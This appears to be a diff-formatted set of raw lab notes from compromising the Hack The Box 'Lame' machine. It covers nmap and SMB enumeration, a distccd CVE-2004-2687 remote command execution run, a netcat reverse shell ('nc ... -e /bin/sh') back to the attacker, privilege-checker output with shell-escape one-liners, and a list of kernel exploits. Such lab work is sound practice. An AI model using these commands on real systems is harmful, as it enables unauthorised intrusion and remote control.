@@ -1,0 +1,731 @@
+RECON
+root@kali:~/nmap-vulners# nmap -sC -sV -p- -vv -oA full 10.10.10.3
+PORT     STATE SERVICE     REASON         VERSION
+21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.8
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 48:53:5d:04:2b:ad:87:7e:99:3f:44:44:da:e8:4c:10 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAOCJCc8bymdK6wKkG/jThrZAMFqQtkYy/qJuxxO/72xv0RVWWqUsUTyIooR56csq6Wks9bHTySBeZmyp3fZ6gtt+4TfSx7mropp0NuZnhVC9RA5TfkF4enM0GFInmsDLGLzSyyo683/OqpTuK1333cDlwfYsTf1ReUOnt0y+36tfAAAAFQCRZ2s2X+isLfy3+QCUpo0NywXLQQAAAIEAqSDsvuCeU5QzKMXfenKI6zNNgYNXbqCqihpFn2RFX2TWEof3Qsi8zknFbJsOrle+4Vmjqo3b8tKMnOY5iH+nxwABJDf+AfFDCgzh0M3C8W2kcIa6fbdQcVQxD3t6IK6G6GRWrFSQibjEN2iKnAr5Z6/ovhGC9eoK2qveSyyU+4YAAACBANX8A0EhnPvwv3bwSJkzCVnskovv0c70GxtjoAGx1i6+Mj4ztgqlDOTrvv8nFFF0YoTLHqMT/i618DsXxZmKlBJl1yZxU3KroEU9F6Lhkydf7SR3ASxGy+ubLGVShW64NsjJCK/Kzr0kgKjVbWRWqfJan6mq8XT8Kq6jYeIX5d0O
+|   2048 7d:47:0e:50:b6:35:8c:38:cc:32:cb:2c:12:94:be:b6 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAu64pZo1Qgz//6JYH/M41MDM1jpmmF0YVvJ2M3StZpkpo3qGr9yUlTciTlGnGqBAALiCg6f09H+o8Tc6yAXPxADEn7u+zSYCS79CLH1HzfzqF7BEVFXMsY2cin215OfmAPJ9CMQ4PePxk51i0Wjvv6p+bnCC0hadeuFVQ+NPNQa5IFirEeDnjnBEf9sM68ROps8M8U7dmbbMjNU9P6Rm5J2Q9bAFo90DDuGKQHbpas5EPUWmr1QQfdY1d80QHqzDdFvqAFynxXBZhuWuzFxLSkisMngsBPpiHxM1Rs/ONNgku9zQ+romwQltpEcXMMI4+1FPFrL1ig6kbRXjIZSrvFw==
+139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.28a (workgroup: WORKGROUP)
+3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h35m14s, deviation: 3h32m09s, median: 5m13s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 59488/tcp): CLEAN (Timeout)
+|   Check 2 (port 60721/tcp): CLEAN (Timeout)
+|   Check 3 (port 33174/udp): CLEAN (Timeout)
+|   Check 4 (port 40169/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-11-02T17:38:03-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+
+root@kali:~/nmap-vulners# nmap --script distcc-cve2004-2687.nse -p3632 10.10.10.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-02 17:36 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.019s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://distcc.github.io/security.html
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+
+
+
+
+
+root@kali:~/htb/lame# nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 10.10.10.3
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: <blank>
+|   \\10.10.10.3\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (lame server (Samba 3.0.28a))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.3\opt: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.3\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|   \\10.10.10.3\tmp: 
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+
+
+ENUM SAMBA
+
+root@kali:~/htb/lame# smbmap -H 10.10.10.3
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.3...
+[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	print$                                            	NO ACCESS
+	tmp                                               	READ, WRITE
+	opt                                               	NO ACCESS
+	IPC$                                              	NO ACCESS
+
+
+root@kali:~/htb/lame# enum4linux -a 10.10.10.3
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov  2 13:42:35 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.10.3
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ======================================= 
+|    Share Enumeration on 10.10.10.3    |
+ ======================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+WARNING: The "syslog" option is deprecated
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (lame server (Samba 3.0.28a))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            LAME
+
+TEST RPC
+root@kali:~/htb/lame# rpcclient -U "" -N 10.10.10.3
+rpcclient $> 
+
+
+TEST NULL SESSION
+root@kali:~/htb/lame# echo exit | smbclient \\\\10.10.10.3\\tmp
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+
+CONNECT TO TMP
+
+
+root@kali:~/htb/lame# smbclient \\\\10.10.10.3\\tmp
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Nov  2 15:53:56 2020
+  ..                                  D        0  Mon Nov  2 15:37:49 2020
+  5589.jsvc_up                        N        0  Mon Nov  2 15:38:50 2020
+  .ICE-unix                          DH        0  Mon Nov  2 15:37:46 2020
+  vmware-root                         D        0  Mon Nov  2 15:37:44 2020
+  .X11-unix                          DH        0  Mon Nov  2 15:38:13 2020
+  .X0-lock                           HR       11  Mon Nov  2 15:38:13 2020
+  vgauthsvclog.txt.0                  N     1600  Mon Nov  2 15:37:44 2020
+
+		7282168 blocks of size 1024. 5375780 blocks available
+smb: \> get *
+NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
+smb: \> get 5589.jsvc_up 
+NT_STATUS_ACCESS_DENIED opening remote file \5589.jsvc_up
+smb: \> get vgauthsvclog.txt.0 
+getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (18.0 KiloBytes/sec) (average 18.0 KiloBytes/sec)
+
+EXPLOIT
+TEST DISTCDD EXPLOIT
+https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855
+
+root@kali:~/htb/lame# python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c id
+[OK] Connected to remote service
+
+--- BEGIN BUFFER ---
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+
+--- END BUFFER ---
+
+[OK] Done.
+
+GET LOW PRIV SHELL
+root@kali:~/htb/lame# python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c cat -c "nc 10.10.14.8 53 -e /bin/sh"
+
+oot@kali:~/htb/lame# nc -lvp 53
+listening on [any] 53 ...
+10.10.10.3: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 50042
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+pwd
+/tmp
+ls -l /home
+total 16
+drwxr-xr-x 2 root    nogroup 4096 Mar 17  2010 ftp
+drwxr-xr-x 2 makis   makis   4096 Mar 14  2017 makis
+drwxr-xr-x 2 service service 4096 Apr 16  2010 service
+drwxr-xr-x 3    1001    1001 4096 May  7  2010 user
+
+ls -l /home/makis
+total 4
+-rw-r--r-- 1 makis makis 33 Mar 14  2017 user.txt
+cat /home/makis/user.txt
+#############################
+
+PRIVESC 
+
+lsb_release -a
+Distributor ID:	Ubuntu
+Description:	Ubuntu 8.04.4 LTS
+Release:	8.04
+Codename:	hardy
+
+CHECK FOR EXPLOITS
+
+
+root@kali:~/htb/lame# cp linuxprivchecker.py .
+root@kali:~/htb/lame# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.3 - - [02/Nov/2020 18:20:55] "GET /linuxprivchecker.py HTTP/1.0" 200 -
+
+chmod 744 /linuxprivchecker.py
+python linuxprivchecker.py
+    # configuration directives that give the server its instructions.
+    # See http://httpd.apache.org/docs/2.2/ for detailed information about
+    # the directives.
+    #
+    # Do NOT simply read the instructions in here without understanding
+    # what they do.  They're here only as hints or reminders.  If you are unsure
+    # consult the online docs. You have been warned.
+    #
+    # The configuration directives are grouped into three basic sections:
+    #  1. Directives that control the operation of the Apache server process as a
+    #     whole (the 'global environment').
+    #  2. Directives that define the parameters of the 'main' or 'default' server,
+    #     which responds to requests that aren't handled by a virtual host.
+    #     These directives also provide default values for the settings
+    #     of all virtual hosts.
+    #  3. Settings for virtual hosts, which allow Web requests to be sent to
+    #     different IP addresses or hostnames and have them handled by the
+    #     same Apache server process.
+    #
+    # Configuration and logfile names: If the filenames you specify for many
+    # of the server's control files begin with "/" (or "drive:/" for Win32), the
+    # server will use that explicit path.  If the filenames do *not* begin
+    # with "/", the value of ServerRoot is prepended -- so "/var/log/apache2/foo.log"
+    # with ServerRoot set to "" will be interpreted by the
+    # server as "//var/log/apache2/foo.log".
+    #
+    ### Section 1: Global Environment
+    #
+    # The directives in this section affect the overall operation of Apache,
+    # such as the number of concurrent requests it can handle or where it
+    # can find its configuration files.
+    #
+    #
+    # ServerRoot: The top of the directory tree under which the server's
+    # configuration, error, and log files are kept.
+    #
+    # NOTE!  If you intend to place this on an NFS (or otherwise network)
+    # mounted filesystem then please read the LockFile documentation (available
+    # at <URL:http://httpd.apache.org/docs-2.1/mod/mpm_common.html#lockfile>);
+    # you will save yourself a lot of trouble.
+    #
+    # Do NOT add a slash at the end of the directory path.
+    #
+    ServerRoot "/etc/apache2"
+    #
+    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    #<IfModule !mpm_winnt.c>
+    #<IfModule !mpm_netware.c>
+    LockFile /var/lock/apache2/accept.lock
+    #</IfModule>
+    #</IfModule>
+    #
+    # PidFile: The file in which the server should record its process
+    # identification number when it starts.
+    # This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    #
+    # Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    #
+    # KeepAlive: Whether or not to allow persistent connections (more than
+    # one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    #
+    # MaxKeepAliveRequests: The maximum number of requests to allow
+    # during a persistent connection. Set to 0 to allow an unlimited amount.
+    # We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    #
+    # KeepAliveTimeout: Number of seconds to wait for the next request from the
+    # same client on the same connection.
+    #
+    KeepAliveTimeout 15
+    ##
+    ## Server-Pool Size Regulation (MPM specific)
+    ##
+    # prefork MPM
+    # StartServers: number of server processes to start
+    # MinSpareServers: minimum number of server processes which are kept spare
+    # MaxSpareServers: maximum number of server processes which are kept spare
+    # MaxClients: maximum number of server processes allowed to start
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_prefork_module>
+    StartServers          5
+    MinSpareServers       5
+    MaxSpareServers      10
+    MaxClients          150
+    MaxRequestsPerChild   0
+    </IfModule>
+    # worker MPM
+    # StartServers: initial number of server processes to start
+    # MaxClients: maximum number of simultaneous client connections
+    # MinSpareThreads: minimum number of worker threads which are kept spare
+    # MaxSpareThreads: maximum number of worker threads which are kept spare
+    # ThreadsPerChild: constant number of worker threads in each server process
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_worker_module>
+    StartServers          2
+    MaxClients          150
+    MinSpareThreads      25
+    MaxSpareThreads      75
+    ThreadsPerChild      25
+    MaxRequestsPerChild   0
+    </IfModule>
+    # These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    #
+    # AccessFileName: The name of the file to look for in each directory
+    # for additional configuration directives.  See also the AllowOverride
+    # directive.
+    #
+    AccessFileName .htaccess
+    #
+    # The following lines prevent .htaccess and .htpasswd files from being
+    # viewed by Web clients.
+    #
+    <Files ~ "^\.ht">
+    Order allow,deny
+    Deny from all
+    </Files>
+    #
+    # DefaultType is the default MIME type the server will use for a document
+    # if it cannot otherwise determine one, such as from filename extensions.
+    # If your server contains mostly text or HTML documents, "text/plain" is
+    # a good value.  If most of your content is binary, such as applications
+    # or images, you may want to use "application/octet-stream" instead to
+    # keep browsers from trying to display binary files as though they are
+    # text.
+    #
+    DefaultType text/plain
+    #
+    # HostnameLookups: Log the names of clients or just their IP addresses
+    # e.g., www.apache.org (on) or 204.62.129.132 (off).
+    # The default is off because it'd be overall better for the net if people
+    # had to knowingly turn this feature on, since enabling it means that
+    # each client request will result in AT LEAST one lookup request to the
+    # nameserver.
+    #
+    HostnameLookups Off
+    # ErrorLog: The location of the error log file.
+    # If you do not specify an ErrorLog directive within a <VirtualHost>
+    # container, error messages relating to that virtual host will be
+    # logged here.  If you *do* define an error logfile for a <VirtualHost>
+    # container, that host's errors will be logged there and not here.
+    #
+    ErrorLog /var/log/apache2/error.log
+    #
+    # LogLevel: Control the number of messages logged to the error_log.
+    # Possible values include: debug, info, notice, warn, error, crit,
+    # alert, emerg.
+    #
+    LogLevel warn
+    # Include module configuration:
+    Include /etc/apache2/mods-enabled/*.load
+    Include /etc/apache2/mods-enabled/*.conf
+    # Include all the user configurations:
+    Include /etc/apache2/httpd.conf
+    # Include ports listing
+    Include /etc/apache2/ports.conf
+    #
+    # The following directives define some format nicknames for use with
+    # a CustomLog directive (see below).
+    # If you are behind a reverse proxy, you might want to change %h into %{X-Forwarded-For}i
+    #
+    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %b" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+    #
+    # ServerTokens
+    # This directive configures what you return as the Server HTTP response
+    # Header. The default is 'Full' which sends information about the OS-Type
+    # and compiled in modules.
+    # Set to one of:  Full | OS | Minor | Minimal | Major | Prod
+    # where Full conveys the most information, and Prod the least.
+    #
+    ServerTokens Full
+    #
+    # Optionally add a line containing the server version and virtual host
+    # name to server-generated pages (internal error documents, FTP directory
+    # listings, mod_status and mod_info output etc., but not CGI generated
+    # documents or custom error documents).
+    # Set to "EMail" to also include a mailto: link to the ServerAdmin.
+    # Set to one of:  On | Off | EMail
+    #
+    ServerSignature On
+    #
+    # Customizable error responses come in three flavors:
+    # 1) plain text 2) local redirects 3) external redirects
+    #
+    # Some examples:
+    #ErrorDocument 500 "The server made a boo boo."
+    #ErrorDocument 404 /missing.html
+    #ErrorDocument 404 "/cgi-bin/missing_handler.pl"
+    #ErrorDocument 402 http://www.example.com/subscription_info.html
+    #
+    #
+    # Putting this all together, we can internationalize error responses.
+    #
+    # We use Alias to redirect any /error/HTTP_<error>.html.var response to
+    # our collection of by-error message multi-language collections.  We use
+    # includes to substitute the appropriate text.
+    #
+    # You can modify the messages' appearance without changing any of the
+    # default HTTP_<error>.html.var files by adding the line:
+    #
+    #   Alias /error/include/ "/your/include/path/"
+    #
+    # which allows you to create your own set of files by starting with the
+    # /usr/share/apache2/error/include/ files and copying them to /your/include/path/,
+    # even on a per-VirtualHost basis.  The default include files will display
+    # your Apache version number and your ServerAdmin email address regardless
+    # of the setting of ServerSignature.
+    #
+    # The internationalized error documents require mod_alias, mod_include
+    # and mod_negotiation.  To activate them, uncomment the following 30 lines.
+    #    Alias /error/ "/usr/share/apache2/error/"
+    #
+    #    <Directory "/usr/share/apache2/error">
+    #        AllowOverride None
+    #        Options IncludesNoExec
+    #        AddOutputFilter Includes html
+    #        AddHandler type-map var
+    #        Order allow,deny
+    #        Allow from all
+    #        LanguagePriority en cs de es fr it nl sv pt-br ro
+    #        ForceLanguagePriority Prefer Fallback
+    #    </Directory>
+    #
+    #    ErrorDocument 400 /error/HTTP_BAD_REQUEST.html.var
+    #    ErrorDocument 401 /error/HTTP_UNAUTHORIZED.html.var
+    #    ErrorDocument 403 /error/HTTP_FORBIDDEN.html.var
+    #    ErrorDocument 404 /error/HTTP_NOT_FOUND.html.var
+    #    ErrorDocument 405 /error/HTTP_METHOD_NOT_ALLOWED.html.var
+    #    ErrorDocument 408 /error/HTTP_REQUEST_TIME_OUT.html.var
+    #    ErrorDocument 410 /error/HTTP_GONE.html.var
+    #    ErrorDocument 411 /error/HTTP_LENGTH_REQUIRED.html.var
+    #    ErrorDocument 412 /error/HTTP_PRECONDITION_FAILED.html.var
+    #    ErrorDocument 413 /error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
+    #    ErrorDocument 414 /error/HTTP_REQUEST_URI_TOO_LARGE.html.var
+    #    ErrorDocument 415 /error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
+    #    ErrorDocument 500 /error/HTTP_INTERNAL_SERVER_ERROR.html.var
+    #    ErrorDocument 501 /error/HTTP_NOT_IMPLEMENTED.html.var
+    #    ErrorDocument 502 /error/HTTP_BAD_GATEWAY.html.var
+    #    ErrorDocument 503 /error/HTTP_SERVICE_UNAVAILABLE.html.var
+    #    ErrorDocument 506 /error/HTTP_VARIANT_ALSO_VARIES.html.var
+    # Include of directories ignores editors' and dpkg's backup files,
+    # see README.Debian for details.
+    # Include generic snippets of statements
+    Include /etc/apache2/conf.d/
+    # Include the virtual host configurations:
+    Include /etc/apache2/sites-enabled/
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.6.9p10
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 4 17:21 0:00 [ksoftirqd/0]
+    root 5356 17:22 0:00 [lockd]
+    root 7 17:21 0:00 [khelper]
+    root 1489 17:21 0:00 [khubd]
+    root 4484 17:21 0:00 /usr/lib/vmware-vgauth/VGAuthService
+    root 4914 17:21 0:00 /sbin/getty
+    root 5456 17:22 0:00 /usr/sbin/nmbd
+    root 5 17:21 0:00 [watchdog/0]
+    root 5363 17:22 0:00 [nfsd]
+    root 1466 17:21 0:00 [scsi_eh_0]
+    root 224 17:21 0:00 [aio/0]
+    root 182 17:21 0:00 [pdflush]
+    root 1 17:21 0:00 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.1.3-5ubuntu12  shell setup for initramfs
+             initramfs-tools 0.85eubuntu39.3  for generating an initramfs
+             initscripts 2.86.ds1-14.1ubuntu45.1  for initializing and shutting down t
+             libklibc 1.5.7-4ubuntu5  libc subset for use with initramfs
+             lsb-base 4.0-0ubuntu0.8.04.1  Standard Base 4.0 init script function
+             module-init-tools 3.3-pre11-4ubuntu5.8.04.1  for managing Linux kernel modules
+             upstart 0.3.9-2  init daemon
+             upstart-compat-sysv 0.3.9-2  for System-V-like init
+             xinit 1.0.7-2  server initialisation tool
+    root 5694 17:22 0:00 -bash
+    root 2347 17:21 0:00 [scsi_eh_2]
+    root 183 17:21 0:00 [kswapd0]
+    root 2 17:21 0:00 [kthreadd]
+    root 5667 17:22 0:00 xterm
+        Possible Related Packages: 
+             xterm 229-1ubuntu1.1  terminal emulator
+    root 1456 17:21 0:00 [ata/0]
+    root 181 17:21 0:00 [pdflush]
+    root 5066 17:21 0:00 /usr/sbin/sshd
+    root 4304 17:21 0:00 [vmmemctl]
+    root 5660 17:22 0:00 Xtightvnc
+    root 5481 17:22 0:00 /usr/sbin/xinetd
+        Possible Related Packages: 
+             xinetd 1:2.3.14-5  for inetd with many enhancements
+    root 5361 17:22 0:00 [nfsd]
+    root 5359 17:22 0:00 [nfsd]
+    root 5360 17:22 0:00 [nfsd]
+    root 4922 17:21 0:00 /sbin/getty
+    root 4683 17:21 0:00 /usr/sbin/rpc.idmapd
+    root 3 17:21 0:00 [migration/0]
+    root 5364 17:22 0:00 [nfsd]
+    root 7395 18:17 0:00 /usr/sbin/smbd
+    root 5362 17:22 0:00 [nfsd]
+    root 5369 17:22 0:00 /usr/sbin/rpc.mountd
+    root 64 17:21 0:00 [kseriod]
+    root 3143 17:21 0:00 [kpsmoused]
+    root 5647 17:22 0:00 /usr/bin/unrealircd
+    root 5015 17:21 0:00 /bin/dd
+    root 5670 17:22 0:00 fluxbox
+        Possible Related Packages: 
+             fluxbox 1.1.1-1~hardy1  configurable and low resource X11 Win
+    root 4925 17:21 0:00 /sbin/getty
+    root 6 17:21 0:00 [events/0]
+    root 5147 17:21 0:00 /bin/sh
+    root 5589 17:22 0:00 /usr/bin/jsvc
+        Possible Related Packages: 
+             jsvc 1.0.2~svn20061127-6  to launch Java applications as daemo
+    root 5588 17:22 0:00 /usr/bin/jsvc
+        Possible Related Packages: 
+             jsvc 1.0.2~svn20061127-6  to launch Java applications as daemo
+    root 5358 17:22 0:00 [nfsd]
+    root 5616 17:22 0:00 /usr/sbin/apache2
+        Possible Related Packages: 
+             apache2 2.2.8-1ubuntu0.25  generation, scalable, extendable web se
+             apache2-mpm-prefork 2.2.8-1ubuntu0.25  model for Apache HTTPD
+             apache2-utils 2.2.8-1ubuntu0.25  programs for webservers
+             apache2.2-common 2.2.8-1ubuntu0.25  generation, scalable, extendable web se
+             libapache2-mod-php5 5.2.4-2ubuntu5.24  HTML-embedded scripting languag
+    root 5641 17:22 0:01 ruby
+        Possible Related Packages: 
+             libruby1.8 1.8.6.111-2ubuntu1.3  necessary to run Ruby 1.8
+             ruby 4.1  interpreter of object-oriented scripting
+             ruby1.8 1.8.6.111-2ubuntu1.3  of object-oriented scripting lan
+    root 2741 17:21 0:00 /sbin/udevd
+    root 5655 17:22 0:00 /sbin/getty
+    root 5437 17:22 0:00 /usr/lib/postfix/master
+        Possible Related Packages: 
+             base-passwd 3.5.16  base system master password and group
+    root 5357 17:22 0:00 [nfsd4]
+    root 5365 17:22 0:00 [nfsd]
+    root 2566 17:21 0:00 [kjournald]
+    root 4120 17:21 0:00 [kjournald]
+    root 41 17:21 0:00 [kblockd/0]
+    root 5664 17:22 0:00 /bin/sh
+    root 4913 17:21 0:00 /sbin/getty
+    root 5191 17:21 0:00 logger
+    root 4668 17:21 0:00 [rpciod/0]
+    root 1265 17:21 0:00 [ksnapd]
+    root 5525 17:22 0:00 /usr/sbin/smbd
+    root 5558 17:22 0:00 /usr/sbin/cron
+        Possible Related Packages: 
+             cron 3.0pl1-100ubuntu2.1  of regular background processing
+    root 4918 17:21 0:00 /sbin/getty
+    root 1459 17:21 0:00 [ata_aux]
+    root 4453 17:21 0:01 /usr/sbin/vmtoolsd
+    root 1472 17:21 0:00 [scsi_eh_1]
+    root 5637 17:22 0:00 /usr/bin/rmiregistry
+    root 5458 17:22 0:00 /usr/sbin/smbd
+    root 1485 17:21 0:00 [ksuspend_usbd]
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/ruby
+    /usr/bin/gcc
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/nmap
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    nmap-->	--interactive
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
+    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - < 2.6.29 exit_notify() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8369 || Language=c
+    - 2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation || http://www.exploit-db.com/exploits/9844 || Language=python
+    - < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit || http://www.exploit-db.com/exploits/14814 || Language=c
+    - 2.x sock_sendpage() Local Root Exploit 2 || http://www.exploit-db.com/exploits/9436 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+    - 2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver) || http://www.exploit-db.com/exploits/9479 || Language=c
+    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
+    - 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit || http://www.exploit-db.com/exploits/5092 || Language=c
+    - Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit || http://www.exploit-db.com/exploits/9083 || Language=c
+    - 2.4/2.6 sock_sendpage() Local Root Exploit [2] || http://www.exploit-db.com/exploits/9598 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - Linux RDS Protocol Local Privilege Escalation || http://www.exploit-db.com/exploits/15285 || Language=c
+    - 2.6.x ptrace_attach Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8673 || Language=c
+    - 2.x sock_sendpage() Local Ring0 Root Exploit || http://www.exploit-db.com/exploits/9435 || Language=c
+    - Test Kernel Local Root Exploit 0day || http://www.exploit-db.com/exploits/9191 || Language=c
+    - 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update) || http://www.exploit-db.com/exploits/926 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - 2.4/2.6 sock_sendpage() Local Root Exploit (ppc) || http://www.exploit-db.com/exploits/9545 || Language=c
+    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
